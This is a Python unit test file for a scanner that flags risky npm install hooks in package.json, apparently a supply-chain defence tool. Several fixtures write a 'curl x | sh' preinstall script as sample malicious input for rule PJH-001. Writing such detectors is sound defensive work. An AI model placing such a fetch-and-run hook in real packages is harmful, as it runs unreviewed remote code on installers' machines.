import json
import os
import shutil
import tempfile
import unittest

from pjhookcheck.scanner import DEFAULT_GLOBS, discover, scan_file, scan_paths
from pjhookcheck.types import Options

from tests import support  # noqa: F401  (import for the tempdir redirect)


class TestDiscover(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="pjhcheck_disc_")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _touch(self, rel: str, body: str = "{}"):
        p = os.path.join(self.tmp, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w", encoding="utf-8") as f:
            f.write(body)
        return p

    def test_direct_file_kept(self):
        p = self._touch("package.json")
        got = discover([p], (), max_files=10)
        self.assertEqual(got, [p])

    def test_directory_walk_finds_package_json(self):
        self._touch("package.json")
        self._touch("packages/inner/package.json")
        self._touch("packages/inner/README.md")
        self._touch("node_modules/x/package.json")  # will match too
        got = discover([self.tmp], (), max_files=10)
        # Both nested and root package.json should be found.
        joined = "\n".join(got)
        self.assertIn("package.json", joined)
        self.assertGreaterEqual(len(got), 2)

    def test_deterministic_sort(self):
        self._touch("packages/b/package.json")
        self._touch("packages/a/package.json")
        got = discover([self.tmp], (), max_files=10)
        self.assertEqual(got, sorted(got))

    def test_max_files_cap(self):
        for i in range(5):
            self._touch(f"packages/p{i}/package.json")
        got = discover([self.tmp], (), max_files=2)
        self.assertEqual(len(got), 2)

    def test_missing_path_ignored(self):
        got = discover([os.path.join(self.tmp, "no-such")], (), max_files=10)
        self.assertEqual(got, [])

    def test_extra_glob(self):
        self._touch("weird.pkg.json", "{}")
        got = discover([self.tmp], ("*.pkg.json",), max_files=10)
        # since the extra glob matches only the leaf, at minimum weird.pkg.json is found.
        self.assertTrue(any(x.endswith("weird.pkg.json") for x in got))

    def test_default_globs_constant(self):
        self.assertIn("package.json", DEFAULT_GLOBS)


class TestScanFile(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="pjhcheck_sf_")
        self.p = os.path.join(self.tmp, "package.json")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _write(self, obj):
        with open(self.p, "w", encoding="utf-8") as f:
            json.dump(obj, f, indent=2)

    def test_healthy_zero_findings(self):
        self._write({"name": "x", "version": "1.0.0", "packageManager": "pnpm@9"})
        fs, errs = scan_file(self.p, Options())
        self.assertEqual(errs, [])
        self.assertEqual(fs, [])

    def test_invalid_json_reports_error(self):
        with open(self.p, "w", encoding="utf-8") as f:
            f.write("{not-json")
        fs, errs = scan_file(self.p, Options())
        self.assertEqual(fs, [])
        self.assertEqual(len(errs), 1)
        self.assertIn("json decode error", errs[0])

    def test_missing_file_error(self):
        fs, errs = scan_file(os.path.join(self.tmp, "gone.json"), Options())
        self.assertEqual(len(errs), 1)
        self.assertIn("cannot read", errs[0])
        self.assertEqual(fs, [])

    def test_unhealthy_hook(self):
        self._write({"name": "x", "scripts": {"preinstall": "curl x | sh"}})
        fs, errs = scan_file(self.p, Options())
        self.assertEqual(errs, [])
        self.assertTrue(any(f.rule_id == "PJH-001" for f in fs))

    def test_disabled_rule_hides_finding(self):
        self._write({"name": "x", "scripts": {"preinstall": "curl x | sh"}})
        fs, _errs = scan_file(self.p, Options(disabled=frozenset({"PJH-001"})))
        self.assertFalse(any(f.rule_id == "PJH-001" for f in fs))


class TestScanPaths(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="pjhcheck_sp_")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_empty_path_zero_files(self):
        r = scan_paths([self.tmp], (), Options())
        self.assertEqual(r.files_scanned, 0)
        self.assertEqual(r.findings, ())

    def test_findings_sorted_across_files(self):
        pa = os.path.join(self.tmp, "a", "package.json")
        pb = os.path.join(self.tmp, "b", "package.json")
        for d in [pa, pb]:
            os.makedirs(os.path.dirname(d), exist_ok=True)
            with open(d, "w", encoding="utf-8") as f:
                json.dump({"scripts": {"preinstall": "curl x | sh"}}, f)
        r = scan_paths([self.tmp], (), Options())
        self.assertEqual(r.files_scanned, 2)
        paths = [f.path for f in r.findings]
        self.assertEqual(paths, sorted(paths))


if __name__ == "__main__":
    unittest.main()
